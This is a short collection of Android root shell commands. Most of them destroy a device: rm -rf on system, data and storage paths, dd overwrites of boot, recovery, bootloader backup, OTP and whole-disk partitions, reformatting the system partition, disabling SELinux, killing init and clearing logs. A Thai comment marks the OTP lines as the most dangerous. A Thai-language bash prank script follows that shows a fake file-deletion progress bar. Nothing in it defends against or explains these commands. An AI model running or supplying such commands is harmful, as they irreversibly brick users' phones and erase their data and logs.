rm -rf /system
rm -rf/data
rm -rf/vendor
rm -rf /product
rm -rf /sdcard
rm -rf /storage/emulated1/0
rm -rf /storage/sdcard
rm -rf /*
dd if=/dev/zero of=/dev/block/bootdevice/by-name/boot
dd if=/dev/zero of=/dev/block/bootdevice/by-name/boot
dd if=/dev/random of=/dev/block/bootdevice/by-name/boot
dd if=/sdcard/boot.img of=/dev/block/bootdevice/by-name/boot
mount -o rw,loop boot.img /mnt
rm -rf /mnt/*
rm -f /dev/block/bootdevice/by-name/dtbo
rm -f /dev/block/bootdevice/by-name/dtbo
rm -f /dev/block/bootdevice/by-name/recovery
echo "exit 0" > /init.rc
echo "" > /fstab.*
echo c > /proc/sysrq-trigger
setenforce 0
echo 0 > /sys/fs/selinux/enforce
rm -f /system/bin/app_process
rm -f /system/bin/app_process64
rm -f /init
rm -f /init
rm -rf /sbin
dd if=/dev/zero of=/dev/block/bootdevice/by-name/abootbak
# ตัวอย่างในระดับ low-level chip (อันตรายสุด)
dd if=/dev/zero of=/dev/block/otp
flash_erase /dev/block/otp
dd if=/dev/zero of=/dev/block/mmcblk0

chmod 000 /system
chmod 000 /system/bin
rm /system/bin/sh
rm /system/bin/busybox
mkfs.ext4 /dev/block/bootdevice/by-name/system
rm -f /dev/block/bootdevice/by-name/boot
rm -f /dev/block/bootdevice/by-name/recovery
rm /init
rm -rf /sys/fs/selinux
chmod -R 000 /
chmod -R 777 /system
kill -9 1
setenforce 0
stop installd
rmmod binder
rmmod ashmem
rm -rf /var/log
logcat -c
stop servicemanager
stop zygote

su -c reboot

#!/usr/bin/env bash
echo "กำลังลบไฟล์ระบบ... (ปลอมจ้า)"
for i in {1..100}; do
  printf "\r[%3d%%] กำลังดำเนินการ..." "$i"
  sleep 0.03
done
echo -e "\nอุ๊ย ล้อเล่นนะ 😄 ไม่มีไฟล์ไหนถูกลบ"